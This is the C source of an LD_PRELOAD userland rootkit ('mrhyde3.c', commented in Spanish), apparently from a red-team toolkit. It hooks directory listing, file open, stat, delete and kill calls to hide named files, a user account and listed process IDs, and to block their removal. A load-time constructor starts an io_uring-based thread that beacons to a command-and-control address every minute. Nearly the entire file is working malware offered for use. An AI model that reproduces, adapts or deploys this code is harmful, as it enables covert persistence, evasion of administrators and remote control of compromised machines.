/**
 * @file mrhyde3.c
 * @brief Rootkit con io_uring (syscalls directas) y fallback seguro.
 * @compile gcc -fPIC -shared -o mrhyde.so -ldl -pthread mrhyde3.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dlfcn.h>
#include <pwd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/wait.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/syscall.h>
#include <linux/io_uring.h>
#include <sys/mman.h>
#include <stdarg.h>
#include <linux/limits.h>
#include <poll.h>     /* para timeout */

/* Constantes de ocultación */
#define HIDDEN_DIR "lazyown_atomic_test"
#define HIDDEN_FILE "mrhyde.so"
#define HIDDEN_FILE1 "payload.sh"
#define HIDDEN_FILE2 "{line}"
#define HIDDEN_FILE3 "l_{line}"
#define HIDDEN_FILE4 "{line}_service.sh"
#define HIDDEN_FILE5 "l_{line}_service.sh"
#define HIDDEN_FILE6 "monrev"
#define HIDDEN_FILE7 "{line}.service"
#define HIDDEN_FILE8 "listener_{line}.py"
#define HIDDEN_FILE9 "listener_{line}.sh"
#define PATHMRHYDE "mrhyde.so"
#define HIDE_DIR ".grisun0"
#define HIDE_USER "grisun0"
#define MAX_HIDE_PIDS 140
#define PID_FILE_PATH "/dev/shm/pid"
#define FILE_HIDE_PATH "/dev/shm/file"
#define IO_URING_QUEUE_DEPTH 64
#define IO_URING_BUFFER_SIZE 4096
#define C2_SERVER_IP "192.168.1.100"
#define C2_PORT 4444
#define CQE_TIMEOUT_MS 500   /* timeout para esperar CQEs */

/* Estructuras para io_uring manual */
struct io_uring_sq {
    unsigned *head, *tail, *ring_mask, *ring_entries, *flags, *array;
    struct io_uring_sqe *sqes;
};
struct io_uring_cq {
    unsigned *head, *tail, *ring_mask, *ring_entries;
    struct io_uring_cqe *cqes;
};
struct io_uring {
    int ring_fd;
    struct io_uring_sq sq;
    struct io_uring_cq cq;
    size_t sq_ring_size, cq_ring_size, sqes_size;
};

/* Syscalls */
static inline int __io_uring_setup(unsigned int entries, struct io_uring_params *p) {
    return syscall(__NR_io_uring_setup, entries, p);
}
static inline int __io_uring_enter(int fd, unsigned int to_submit, unsigned int min_complete,
                                   unsigned int flags, sigset_t *sig) {
    return syscall(__NR_io_uring_enter, fd, to_submit, min_complete, flags, sig, _NSIG / 8);
}
static inline int __io_uring_register(int fd, unsigned int opcode, const void *arg, unsigned int nr_args) {
    return syscall(__NR_io_uring_register, fd, opcode, arg, nr_args);
}

/* Inicializar anillo */
static int uring_queue_init(unsigned int entries, struct io_uring *ring) {
    struct io_uring_params params;
    memset(&params, 0, sizeof(params));
    params.flags = IORING_SETUP_SQPOLL | IORING_SETUP_IOPOLL;
    params.sq_thread_idle = 2000;

    int fd = __io_uring_setup(entries, &params);
    if (fd < 0) return fd;
    ring->ring_fd = fd;

    size_t sq_ring_size = params.sq_off.array + params.sq_entries * sizeof(unsigned);
    size_t cq_ring_size = params.cq_off.cqes + params.cq_entries * sizeof(struct io_uring_cqe);
    size_t sqes_size = params.sq_entries * sizeof(struct io_uring_sqe);

    void *sq_ring = mmap(NULL, sq_ring_size, PROT_READ | PROT_WRITE,
                         MAP_SHARED | MAP_POPULATE, fd, IORING_OFF_SQ_RING);
    if (sq_ring == MAP_FAILED) { close(fd); return -1; }
    void *cq_ring = mmap(NULL, cq_ring_size, PROT_READ | PROT_WRITE,
                         MAP_SHARED | MAP_POPULATE, fd, IORING_OFF_CQ_RING);
    if (cq_ring == MAP_FAILED) { munmap(sq_ring, sq_ring_size); close(fd); return -1; }
    void *sqes = mmap(NULL, sqes_size, PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_POPULATE, fd, IORING_OFF_SQES);
    if (sqes == MAP_FAILED) { munmap(sq_ring, sq_ring_size); munmap(cq_ring, cq_ring_size); close(fd); return -1; }

    ring->sq.head = (unsigned *)((char *)sq_ring + params.sq_off.head);
    ring->sq.tail = (unsigned *)((char *)sq_ring + params.sq_off.tail);
    ring->sq.ring_mask = (unsigned *)((char *)sq_ring + params.sq_off.ring_mask);
    ring->sq.ring_entries = (unsigned *)((char *)sq_ring + params.sq_off.ring_entries);
    ring->sq.flags = (unsigned *)((char *)sq_ring + params.sq_off.flags);
    ring->sq.array = (unsigned *)((char *)sq_ring + params.sq_off.array);
    ring->sq.sqes = (struct io_uring_sqe *)sqes;

    ring->cq.head = (unsigned *)((char *)cq_ring + params.cq_off.head);
    ring->cq.tail = (unsigned *)((char *)cq_ring + params.cq_off.tail);
    ring->cq.ring_mask = (unsigned *)((char *)cq_ring + params.cq_off.ring_mask);
    ring->cq.ring_entries = (unsigned *)((char *)cq_ring + params.cq_off.ring_entries);
    ring->cq.cqes = (struct io_uring_cqe *)((char *)cq_ring + params.cq_off.cqes);

    ring->sq_ring_size = sq_ring_size;
    ring->cq_ring_size = cq_ring_size;
    ring->sqes_size = sqes_size;
    return 0;
}

/* Obtener SQE */
static struct io_uring_sqe *uring_get_sqe(struct io_uring *ring) {
    unsigned head = *ring->sq.head;
    unsigned tail = *ring->sq.tail;
    unsigned next = tail + 1;
    if (next - head > *ring->sq.ring_entries) return NULL;
    struct io_uring_sqe *sqe = &ring->sq.sqes[tail & *ring->sq.ring_mask];
    memset(sqe, 0, sizeof(*sqe));
    return sqe;
}

/* Enviar SQE */
static int uring_submit(struct io_uring *ring) {
    unsigned tail = *ring->sq.tail;
    unsigned to_submit = tail - *ring->sq.head;
    if (!to_submit) return 0;
    return __io_uring_enter(ring->ring_fd, to_submit, 0, 0, NULL);
}

/* Esperar CQE con timeout (usa poll) */
static int uring_wait_cqe_timeout(struct io_uring *ring, struct io_uring_cqe **cqe_ptr, int timeout_ms) {
    struct pollfd pfd;
    pfd.fd = ring->ring_fd;
    pfd.events = POLLIN;
    int ret = poll(&pfd, 1, timeout_ms);
    if (ret <= 0) return -1;  /* timeout o error */

    unsigned head = *ring->cq.head;
    unsigned tail = *ring->cq.tail;
    if (head == tail) return -1;  /* no hay CQE */
    *cqe_ptr = &ring->cq.cqes[head & *ring->cq.ring_mask];
    return 0;
}

static void uring_cqe_seen(struct io_uring *ring, struct io_uring_cqe *cqe) {
    (*ring->cq.head)++;
}

/* Estado global del rootkit */
static struct io_uring root_ring;
static int ring_initialised = 0;
static int ring_ok = 0;           /* indica si el anillo funciona */
static pthread_mutex_t ring_mutex = PTHREAD_MUTEX_INITIALIZER;
char *hide_pids[MAX_HIDE_PIDS];
char *hide_files[MAX_HIDE_PIDS];

/* Inicialización con manejo de errores */
static int init_root_ring(void) {
    if (ring_initialised) return ring_ok ? 0 : -1;
    ring_initialised = 1;
    int ret = uring_queue_init(IO_URING_QUEUE_DEPTH, &root_ring);
    if (ret < 0) {
        ring_ok = 0;
        return -1;
    }
    ring_ok = 1;
    /* Registrar buffer (opcional) */
    struct iovec iov;
    iov.iov_base = malloc(IO_URING_BUFFER_SIZE);
    iov.iov_len = IO_URING_BUFFER_SIZE;
    if (iov.iov_base) {
        __io_uring_register(root_ring.ring_fd, IORING_REGISTER_BUFFERS, &iov, 1);
        free(iov.iov_base);
    }
    return 0;
}

/* Leer archivo completo con io_uring (con timeout) */
static char *uring_read_whole_file(const char *path) {
    if (!ring_ok) return NULL;
    pthread_mutex_lock(&ring_mutex);

    int fd = -1;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    char *buf = NULL;
    size_t total_read = 0;
    int ret;

    sqe = uring_get_sqe(&root_ring);
    if (!sqe) { pthread_mutex_unlock(&ring_mutex); return NULL; }
    sqe->opcode = IORING_OP_OPENAT;
    sqe->fd = AT_FDCWD;
    sqe->addr = (unsigned long)path;
    sqe->open_flags = O_RDONLY;
    sqe->user_data = 1;
    uring_submit(&root_ring);
    ret = uring_wait_cqe_timeout(&root_ring, &cqe, CQE_TIMEOUT_MS);
    if (ret < 0) { pthread_mutex_unlock(&ring_mutex); return NULL; }
    fd = cqe->res;
    uring_cqe_seen(&root_ring, cqe);
    if (fd < 0) { pthread_mutex_unlock(&ring_mutex); return NULL; }

    char block[IO_URING_BUFFER_SIZE];
    int bytes_read;
    off_t offset = 0;
    do {
        sqe = uring_get_sqe(&root_ring);
        if (!sqe) { close(fd); pthread_mutex_unlock(&ring_mutex); return NULL; }
        sqe->opcode = IORING_OP_READ;
        sqe->fd = fd;
        sqe->addr = (unsigned long)block;
        sqe->len = sizeof(block);
        sqe->off = offset;
        sqe->user_data = 2;
        uring_submit(&root_ring);
        ret = uring_wait_cqe_timeout(&root_ring, &cqe, CQE_TIMEOUT_MS);
        if (ret < 0) break;
        bytes_read = cqe->res;
        uring_cqe_seen(&root_ring, cqe);
        if (bytes_read <= 0) break;
        buf = realloc(buf, total_read + bytes_read + 1);
        if (!buf) { close(fd); pthread_mutex_unlock(&ring_mutex); return NULL; }
        memcpy(buf + total_read, block, bytes_read);
        total_read += bytes_read;
        offset += bytes_read;
    } while (bytes_read > 0);
    close(fd);
    if (buf) buf[total_read] = '\0';
    pthread_mutex_unlock(&ring_mutex);
    return buf;
}

/* Fallback: leer archivo con métodos tradicionales */
static char *traditional_read_file(const char *path) {
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);
    char *buf = malloc(size + 1);
    if (!buf) { fclose(f); return NULL; }
    size_t read = fread(buf, 1, size, f);
    buf[read] = '\0';
    fclose(f);
    return buf;
}

/* Cargar listas con fallback */
void load_hidden_pids(void) {
    char *data = uring_read_whole_file(PID_FILE_PATH);
    if (!data) data = traditional_read_file(PID_FILE_PATH);
    if (!data) return;
    char *saveptr, *token;
    int index = 14;
    token = strtok_r(data, ",\"\n", &saveptr);
    while (token && index < MAX_HIDE_PIDS) {
        hide_pids[index++] = strdup(token);
        token = strtok_r(NULL, ",\"\n", &saveptr);
    }
    free(data);
}

void load_hidden_files(void) {
    char *data = uring_read_whole_file(FILE_HIDE_PATH);
    if (!data) data = traditional_read_file(FILE_HIDE_PATH);
    if (!data) return;
    char *saveptr, *token;
    int index = 4;
    token = strtok_r(data, ",\"\n", &saveptr);
    while (token && index < MAX_HIDE_PIDS) {
        hide_files[index++] = strdup(token);
        token = strtok_r(NULL, ",\"\n", &saveptr);
    }
    free(data);
}

/* get_username_from_pid (tradicional) */
char* get_username_from_pid(pid_t pid) {
    char path[30];
    struct stat sb;
    uid_t uid;
    struct passwd *pw;
    snprintf(path, sizeof(path), "/proc/%d", pid);
    if (stat(path, &sb) == -1) return NULL;
    uid = sb.st_uid;
    pw = getpwuid(uid);
    return pw ? pw->pw_name : NULL;
}

/* ----------------------------------------------------------------------
   HOOKS TRADICIONALES (sin cambios, usan hide_pids/hide_files)
   ---------------------------------------------------------------------- */
typedef struct dirent original_dirent;
typedef struct dirent* (*original_readdir_t)(DIR*);
typedef int (*orig_unlink_f_type)(const char *pathname);
typedef int (*orig_kill_f_type)(pid_t pid, int sig);
typedef int (*orig_remove_f_type)(const char *);
typedef int (*orig_unlinkat_f_type)(int, const char *, int);
original_readdir_t original_readdir = NULL;

int should_hide_pid(const char* pid) {
    pid_t pid_num = atoi(pid);
    char* username = get_username_from_pid(pid_num);
    if (username && strcmp(username, HIDE_USER) == 0) return 1;
    for (int i = 0; i < MAX_HIDE_PIDS && hide_pids[i] != NULL; i++) {
        if (hide_pids[i] && strcmp(hide_pids[i], pid) == 0) return 1;
    }
    return 0;
}
int should_hide_file(const char* filename) {
    for (int i = 0; i < MAX_HIDE_PIDS && hide_files[i] != NULL; i++) {
        if (hide_files[i] && strcmp(hide_files[i], filename) == 0) return 1;
    }
    return 0;
}

struct dirent* readdir(DIR* dirp) {
    if (original_readdir == NULL) {
        original_readdir = (original_readdir_t)dlsym(RTLD_NEXT, "readdir");
        if (original_readdir == NULL) return NULL;
    }
    struct dirent* entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        int hide = 0;
        if (strcmp(entry->d_name, HIDDEN_DIR) == 0 ||
            strcmp(entry->d_name, HIDE_DIR) == 0) hide = 1;
        if (strcmp(entry->d_name, HIDDEN_FILE) == 0 ||
            strcmp(entry->d_name, HIDDEN_FILE1) == 0 ||
            strcmp(entry->d_name, HIDDEN_FILE2) == 0 ||
            strcmp(entry->d_name, HIDDEN_FILE3) == 0 ||
            strcmp(entry->d_name, HIDDEN_FILE4) == 0 ||
            strcmp(entry->d_name, HIDDEN_FILE5) == 0 ||
            strcmp(entry->d_name, HIDDEN_FILE6) == 0 ||
            strcmp(entry->d_name, HIDDEN_FILE7) == 0 ||
            strcmp(entry->d_name, HIDDEN_FILE8) == 0 ||
            strcmp(entry->d_name, HIDDEN_FILE9) == 0) hide = 1;
        if (should_hide_pid(entry->d_name)) hide = 1;
        if (should_hide_file(entry->d_name)) hide = 1;
        for (int i = 0; i < MAX_HIDE_PIDS && hide_pids[i] != NULL; i++) {
            if (hide_pids[i] && strcmp(entry->d_name, hide_pids[i]) == 0) { hide = 1; break; }
        }
        if (hide) continue;
        return entry;
    }
    return NULL;
}

int unlink(const char *pathname) {
    static orig_unlink_f_type orig_unlink = NULL;
    if (!orig_unlink) orig_unlink = (orig_unlink_f_type)dlsym(RTLD_NEXT, "unlink");
    if (strcmp(pathname, PATHMRHYDE) == 0) return -1;
    return orig_unlink(pathname);
}
int kill(pid_t pid, int sig) {
    static orig_kill_f_type orig_kill = NULL;
    static pid_t my_pid = 0;
    if (!orig_kill) { orig_kill = (orig_kill_f_type)dlsym(RTLD_NEXT, "kill"); my_pid = getpid(); }
    if (pid == my_pid) return -1;
    for (int i = 0; i < MAX_HIDE_PIDS && hide_pids[i] != NULL; i++) {
        if (hide_pids[i] && atoi(hide_pids[i]) == pid) return -1;
    }
    return orig_kill(pid, sig);
}
int remove(const char *pathname) {
    static orig_remove_f_type orig_remove = NULL;
    if (!orig_remove) orig_remove = (orig_remove_f_type)dlsym(RTLD_NEXT, "remove");
    if (strcmp(pathname, PATHMRHYDE) == 0) return -1;
    return orig_remove(pathname);
}
int unlinkat(int dirfd, const char *pathname, int flags) {
    static orig_unlinkat_f_type orig_unlinkat = NULL;
    if (!orig_unlinkat) orig_unlinkat = (orig_unlinkat_f_type)dlsym(RTLD_NEXT, "unlinkat");
    if (strcmp(pathname, PATHMRHYDE) == 0 ||
        strstr(pathname, HIDDEN_FILE) != NULL ||
        strstr(pathname, HIDDEN_FILE1) != NULL ||
        strstr(pathname, HIDDEN_FILE2) != NULL ||
        strstr(pathname, HIDDEN_FILE3) != NULL ||
        strstr(pathname, HIDDEN_FILE4) != NULL ||
        strstr(pathname, HIDDEN_FILE5) != NULL ||
        strstr(pathname, HIDDEN_FILE6) != NULL ||
        strstr(pathname, HIDDEN_FILE7) != NULL ||
        strstr(pathname, HIDDEN_FILE8) != NULL ||
        strstr(pathname, HIDDEN_FILE9) != NULL) return -1;
    return orig_unlinkat(dirfd, pathname, flags);
}

FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE *fopen(const char *pathname, const char *mode) {
    if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, "fopen");
    int hide = 0;
    if (strstr(pathname, HIDDEN_FILE) != NULL ||
        strstr(pathname, HIDDEN_FILE1) != NULL ||
        strstr(pathname, HIDDEN_FILE2) != NULL ||
        strstr(pathname, HIDDEN_FILE3) != NULL ||
        strstr(pathname, HIDDEN_FILE4) != NULL ||
        strstr(pathname, HIDDEN_FILE5) != NULL ||
        strstr(pathname, HIDDEN_FILE6) != NULL ||
        strstr(pathname, HIDDEN_FILE7) != NULL ||
        strstr(pathname, HIDDEN_FILE8) != NULL ||
        strstr(pathname, HIDDEN_FILE9) != NULL) hide = 1;
    for (int i = 0; i < MAX_HIDE_PIDS && hide_pids[i] != NULL; i++) {
        if (hide_pids[i] && strstr(pathname, hide_pids[i]) != NULL) { hide = 1; break; }
    }
    for (int i = 0; i < MAX_HIDE_PIDS && hide_files[i] != NULL; i++) {
        if (hide_files[i] && strstr(pathname, hide_files[i]) != NULL) { hide = 1; break; }
    }
    if (hide) { errno = ENOENT; return NULL; }
    return orig_fopen(pathname, mode);
}

int open(const char *pathname, int flags, ...) {
    static int (*orig_open)(const char *, int, ...) = NULL;
    if (!orig_open) orig_open = (int (*)(const char *, int, ...))dlsym(RTLD_NEXT, "open");
    int hide = 0;
    if (strstr(pathname, HIDDEN_FILE) != NULL ||
        strstr(pathname, HIDDEN_FILE1) != NULL ||
        strstr(pathname, HIDDEN_FILE2) != NULL ||
        strstr(pathname, HIDDEN_FILE3) != NULL ||
        strstr(pathname, HIDDEN_FILE4) != NULL ||
        strstr(pathname, HIDDEN_FILE5) != NULL ||
        strstr(pathname, HIDDEN_FILE6) != NULL ||
        strstr(pathname, HIDDEN_FILE7) != NULL ||
        strstr(pathname, HIDDEN_FILE8) != NULL ||
        strstr(pathname, HIDDEN_FILE9) != NULL) hide = 1;
    for (int i = 0; i < MAX_HIDE_PIDS && hide_pids[i] != NULL; i++) {
        if (hide_pids[i] && strstr(pathname, hide_pids[i]) != NULL) { hide = 1; break; }
    }
    for (int i = 0; i < MAX_HIDE_PIDS && hide_files[i] != NULL; i++) {
        if (hide_files[i] && strstr(pathname, hide_files[i]) != NULL) { hide = 1; break; }
    }
    if (hide) { errno = ENOENT; return -1; }
    va_list args;
    va_start(args, flags);
    mode_t mode = va_arg(args, mode_t);
    va_end(args);
    return orig_open(pathname, flags, mode);
}

int openat(int dirfd, const char *pathname, int flags, ...) {
    static int (*orig_openat)(int, const char *, int, ...) = NULL;
    if (!orig_openat) orig_openat = (int (*)(int, const char *, int, ...))dlsym(RTLD_NEXT, "openat");
    int hide = 0;
    if (strstr(pathname, HIDDEN_FILE) != NULL ||
        strstr(pathname, HIDDEN_FILE1) != NULL ||
        strstr(pathname, HIDDEN_FILE2) != NULL ||
        strstr(pathname, HIDDEN_FILE3) != NULL ||
        strstr(pathname, HIDDEN_FILE4) != NULL ||
        strstr(pathname, HIDDEN_FILE5) != NULL ||
        strstr(pathname, HIDDEN_FILE6) != NULL ||
        strstr(pathname, HIDDEN_FILE7) != NULL ||
        strstr(pathname, HIDDEN_FILE8) != NULL ||
        strstr(pathname, HIDDEN_FILE9) != NULL) hide = 1;
    for (int i = 0; i < MAX_HIDE_PIDS && hide_pids[i] != NULL; i++) {
        if (hide_pids[i] && strstr(pathname, hide_pids[i]) != NULL) { hide = 1; break; }
    }
    for (int i = 0; i < MAX_HIDE_PIDS && hide_files[i] != NULL; i++) {
        if (hide_files[i] && strstr(pathname, hide_files[i]) != NULL) { hide = 1; break; }
    }
    if (hide) { errno = ENOENT; return -1; }
    va_list args;
    va_start(args, flags);
    mode_t mode = va_arg(args, mode_t);
    va_end(args);
    return orig_openat(dirfd, pathname, flags, mode);
}

int (*orig_stat)(const char *pathname, struct stat *statbuf);
int stat(const char *pathname, struct stat *statbuf) {
    if (!orig_stat) orig_stat = dlsym(RTLD_NEXT, "stat");
    int hide = 0;
    if (strstr(pathname, HIDDEN_FILE) != NULL ||
        strstr(pathname, HIDDEN_FILE1) != NULL ||
        strstr(pathname, HIDDEN_FILE2) != NULL ||
        strstr(pathname, HIDDEN_FILE3) != NULL ||
        strstr(pathname, HIDDEN_FILE4) != NULL ||
        strstr(pathname, HIDDEN_FILE5) != NULL ||
        strstr(pathname, HIDDEN_FILE6) != NULL ||
        strstr(pathname, HIDDEN_FILE7) != NULL ||
        strstr(pathname, HIDDEN_FILE8) != NULL ||
        strstr(pathname, HIDDEN_FILE9) != NULL) hide = 1;
    for (int i = 0; i < MAX_HIDE_PIDS && hide_pids[i] != NULL; i++) {
        if (hide_pids[i] && strstr(pathname, hide_pids[i]) != NULL) { hide = 1; break; }
    }
    for (int i = 0; i < MAX_HIDE_PIDS && hide_files[i] != NULL; i++) {
        if (hide_files[i] && strstr(pathname, hide_files[i]) != NULL) { hide = 1; break; }
    }
    if (hide) { errno = ENOENT; return -1; }
    return orig_stat(pathname, statbuf);
}

int (*orig_lstat)(const char *pathname, struct stat *statbuf);
int lstat(const char *pathname, struct stat *statbuf) {
    if (!orig_lstat) orig_lstat = dlsym(RTLD_NEXT, "lstat");
    int hide = 0;
    if (strstr(pathname, HIDDEN_FILE) != NULL ||
        strstr(pathname, HIDDEN_FILE1) != NULL ||
        strstr(pathname, HIDDEN_FILE2) != NULL ||
        strstr(pathname, HIDDEN_FILE3) != NULL ||
        strstr(pathname, HIDDEN_FILE4) != NULL ||
        strstr(pathname, HIDDEN_FILE5) != NULL ||
        strstr(pathname, HIDDEN_FILE6) != NULL ||
        strstr(pathname, HIDDEN_FILE7) != NULL ||
        strstr(pathname, HIDDEN_FILE8) != NULL ||
        strstr(pathname, HIDDEN_FILE9) != NULL) hide = 1;
    for (int i = 0; i < MAX_HIDE_PIDS && hide_pids[i] != NULL; i++) {
        if (hide_pids[i] && strstr(pathname, hide_pids[i]) != NULL) { hide = 1; break; }
    }
    for (int i = 0; i < MAX_HIDE_PIDS && hide_files[i] != NULL; i++) {
        if (hide_files[i] && strstr(pathname, hide_files[i]) != NULL) { hide = 1; break; }
    }
    if (hide) { errno = ENOENT; return -1; }
    return orig_lstat(pathname, statbuf);
}

int (*orig_fstat)(int fd, struct stat *statbuf);
int fstat(int fd, struct stat *statbuf) {
    if (!orig_fstat) orig_fstat = dlsym(RTLD_NEXT, "fstat");
    char path[1024];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    int hide = 0;
    if (strstr(path, HIDDEN_FILE) != NULL ||
        strstr(path, HIDDEN_FILE1) != NULL ||
        strstr(path, HIDDEN_FILE2) != NULL ||
        strstr(path, HIDDEN_FILE3) != NULL ||
        strstr(path, HIDDEN_FILE4) != NULL ||
        strstr(path, HIDDEN_FILE5) != NULL ||
        strstr(path, HIDDEN_FILE6) != NULL ||
        strstr(path, HIDDEN_FILE7) != NULL ||
        strstr(path, HIDDEN_FILE8) != NULL ||
        strstr(path, HIDDEN_FILE9) != NULL) hide = 1;
    for (int i = 0; i < MAX_HIDE_PIDS && hide_pids[i] != NULL; i++) {
        if (hide_pids[i] && strstr(path, hide_pids[i]) != NULL) { hide = 1; break; }
    }
    for (int i = 0; i < MAX_HIDE_PIDS && hide_files[i] != NULL; i++) {
        if (hide_files[i] && strstr(path, hide_files[i]) != NULL) { hide = 1; break; }
    }
    if (hide) { errno = ENOENT; return -1; }
    return orig_fstat(fd, statbuf);
}

struct linux_dirent64 {
    int64_t d_ino;
    off_t d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
};

int (*orig_getdents)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
int getdents(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    if (!orig_getdents) orig_getdents = dlsym(RTLD_NEXT, "getdents");
    int nread = orig_getdents(fd, dirp, count);
    if (nread == -1) return -1;
    struct linux_dirent64 *dir;
    unsigned long offset = 0;
    while (offset < nread) {
        dir = (void *)dirp + offset;
        int hide = 0;
        if (strcmp(dir->d_name, HIDDEN_DIR) == 0 ||
            strcmp(dir->d_name, HIDE_DIR) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE1) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE2) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE3) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE4) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE5) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE6) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE7) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE8) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE9) == 0) hide = 1;
        if (should_hide_pid(dir->d_name)) hide = 1;
        if (should_hide_file(dir->d_name)) hide = 1;
        for (int i = 0; i < MAX_HIDE_PIDS && hide_pids[i] != NULL; i++) {
            if (hide_pids[i] && strcmp(dir->d_name, hide_pids[i]) == 0) { hide = 1; break; }
        }
        if (hide) {
            memmove(dirp + offset, dirp + offset + dir->d_reclen, nread - (offset + dir->d_reclen));
            nread -= dir->d_reclen;
            continue;
        }
        offset += dir->d_reclen;
    }
    return nread;
}

ssize_t getdents64(int fd, void *dirp, size_t count) {
    static ssize_t (*orig_getdents64)(int, void *, size_t) = NULL;
    if (!orig_getdents64) orig_getdents64 = dlsym(RTLD_NEXT, "getdents64");
    ssize_t nread = orig_getdents64(fd, dirp, count);
    if (nread == -1) return -1;
    struct linux_dirent64 *dir;
    unsigned long offset = 0;
    while (offset < nread) {
        dir = (struct linux_dirent64 *)((char *)dirp + offset);
        int hide = 0;
        if (strcmp(dir->d_name, HIDDEN_DIR) == 0 ||
            strcmp(dir->d_name, HIDE_DIR) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE1) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE2) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE3) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE4) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE5) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE6) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE7) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE8) == 0 ||
            strcmp(dir->d_name, HIDDEN_FILE9) == 0) hide = 1;
        if (should_hide_pid(dir->d_name)) hide = 1;
        if (should_hide_file(dir->d_name)) hide = 1;
        for (int i = 0; i < MAX_HIDE_PIDS && hide_pids[i] != NULL; i++) {
            if (hide_pids[i] && strcmp(dir->d_name, hide_pids[i]) == 0) { hide = 1; break; }
        }
        if (hide) {
            memmove((char *)dirp + offset, (char *)dirp + offset + dir->d_reclen,
                    nread - (offset + dir->d_reclen));
            nread -= dir->d_reclen;
            continue;
        }
        offset += dir->d_reclen;
    }
    return nread;
}

/* ----------------------------------------------------------------------
   Hilo C2 (solo si el anillo está OK)
   ---------------------------------------------------------------------- */
static void *c2_beacon_thread(void *arg) {
    struct sockaddr_in server_addr;
    int sockfd;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return NULL;

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_SERVER_IP, &server_addr.sin_addr);

    pthread_mutex_lock(&ring_mutex);
    sqe = uring_get_sqe(&root_ring);
    if (sqe) {
        sqe->opcode = IORING_OP_CONNECT;
        sqe->fd = sockfd;
        sqe->addr = (unsigned long)&server_addr;
        sqe->len = sizeof(server_addr);
        sqe->user_data = 20;
        uring_submit(&root_ring);
        if (uring_wait_cqe_timeout(&root_ring, &cqe, 3000) == 0) {
            if (cqe->res < 0) { /* fallo */ }
            uring_cqe_seen(&root_ring, cqe);
        }
    }
    pthread_mutex_unlock(&ring_mutex);

    char beacon_msg[256];
    while (1) {
        snprintf(beacon_msg, sizeof(beacon_msg), "BEACON from PID %d", getpid());
        struct msghdr msg = {0};
        struct iovec iov = { .iov_base = beacon_msg, .iov_len = strlen(beacon_msg) };
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;

        pthread_mutex_lock(&ring_mutex);
        sqe = uring_get_sqe(&root_ring);
        if (sqe) {
            sqe->opcode = IORING_OP_SENDMSG;
            sqe->fd = sockfd;
            sqe->addr = (unsigned long)&msg;
            sqe->len = 0;
            sqe->user_data = 21;
            uring_submit(&root_ring);
            if (uring_wait_cqe_timeout(&root_ring, &cqe, 1000) == 0) {
                uring_cqe_seen(&root_ring, cqe);
            }
        }
        pthread_mutex_unlock(&ring_mutex);
        sleep(60);
    }
    close(sockfd);
    return NULL;
}

/* ----------------------------------------------------------------------
   Constructor: inicializa y carga listas sin bloquear
   ---------------------------------------------------------------------- */
__attribute__((constructor)) void init_rootkit(void) {
    int ret = init_root_ring();
    if (ret == 0) {
        // Si el anillo funciona, cargamos con io_uring; si falla, usamos fallback
        load_hidden_pids();   // internamente usa uring y luego tradicional
        load_hidden_files();
        // Iniciar hilo C2 solo si el anillo está OK
        pthread_t c2_thread;
        pthread_create(&c2_thread, NULL, c2_beacon_thread, NULL);
        pthread_detach(c2_thread);
    } else {
        // Si el anillo falla, cargamos solo con métodos tradicionales
        // y no iniciamos el hilo C2 (para no bloquear)
        char *data = traditional_read_file(PID_FILE_PATH);
        if (data) {
            char *saveptr, *token;
            int index = 14;
            token = strtok_r(data, ",\"\n", &saveptr);
            while (token && index < MAX_HIDE_PIDS) {
                hide_pids[index++] = strdup(token);
                token = strtok_r(NULL, ",\"\n", &saveptr);
            }
            free(data);
        }
        data = traditional_read_file(FILE_HIDE_PATH);
        if (data) {
            char *saveptr, *token;
            int index = 4;
            token = strtok_r(data, ",\"\n", &saveptr);
            while (token && index < MAX_HIDE_PIDS) {
                hide_files[index++] = strdup(token);
                token = strtok_r(NULL, ",\"\n", &saveptr);
            }
            free(data);
        }
    }
}

/* ----------------------------------------------------------------------
   main() de demostración (no se usa con LD_PRELOAD)
   ---------------------------------------------------------------------- */
int main() { return 0; }